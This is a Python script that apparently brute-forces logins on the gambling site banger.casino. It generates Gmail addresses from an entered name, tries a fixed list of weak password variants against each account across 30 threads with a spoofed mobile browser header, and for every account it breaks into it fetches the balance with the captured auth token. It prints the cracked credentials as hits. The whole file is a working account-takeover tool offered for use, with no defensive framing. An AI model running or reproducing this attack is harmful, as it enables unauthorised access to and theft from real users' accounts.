import os
import sys
import json
import string
import random
import requests
from concurrent.futures import ThreadPoolExecutor

class casino():
    def __init__(self):
        self.loop = 0
        self.oks = []
        self.plist = []
        self.G = "\x1b[38;5;46m"
    def logo(self):
        os.system("clear")
        print("""\n • CASINO RE XUDTE ASLAM \n • MAKE : HADI ANHAF AIMAN""")
        print(30*"-")
    def main(self):
        self.logo()
        name = input(f" • NAME  : ")
        limit = int(input(f" • LIMIT  : "))
        print(30*"-")
        for px in ['12', '123', '1234', '12345', '@', '@12@##', '@34@##', '92@##', '92@', '12@', '34@', '@@##', '@@', '@@#', '693', '@']:
            self.plist.append(name + px)
        with ThreadPoolExecutor(max_workers=30) as awm_zone:
            for sex in range(limit):
                user = f"{name}{sex}@gmail.com"
                pasx = self.plist
                awm_zone.submit(self.xuding_casino,user,pasx)
    def balance(self,token):
        head = {
            'Authorization': f'Bearer {token}',
            'Accept': 'application/json',
        }
        sending = requests.get("https://banger.casino/v1/user/balance",headers=head).json()
        if "balance" in sending:
            paisa = sending["balance"]
            return paisa
        return None
    def xuding_casino(self,user,pasx):
        global loop,oks
        sys.stdout.write(f"\x1b[97m\r [{user}]•|•OK>{len(self.oks)}\r")
        sys.stdout.flush()
        try:
            for pas in pasx:
                data = {
                    "login":user,
                    "password":pas,
                }
                head = {
                    'authority': 'banger.casino',
                    'accept': '*/*',
                    'accept-language': 'en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                    'cache-control': 'no-cache',
                    'content-type': 'application/json',
                    'origin': 'https://banger.casino',
                    'pragma': 'no-cache',
                    'referer': 'https://banger.casino/?popup=sign-in',
                    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36'
                }
                url = "https://banger.casino/v1/auth/login"
                tani = requests.post(url,json = data,headers = head).json()
                if "authToken" in tani:
                    token = tani["authToken"]
                    taka = self.balance(token)
                    print(f"\r {self.G}[FUCKED-ID] {user}|{pas}")
                    if taka is None:
                        print(f"\r \x1b[97m • BDT -: {self.G}FOKIR HALAI")
                    else:
                        print(f"\r \x1b[97m • BDT -: {self.G}{taka}")
                    self.oks.append(user)
                    break
                else:continue
            self.loop += 1
        except Exception as e:
            pass

if __name__ == "__main__":
    casino().main()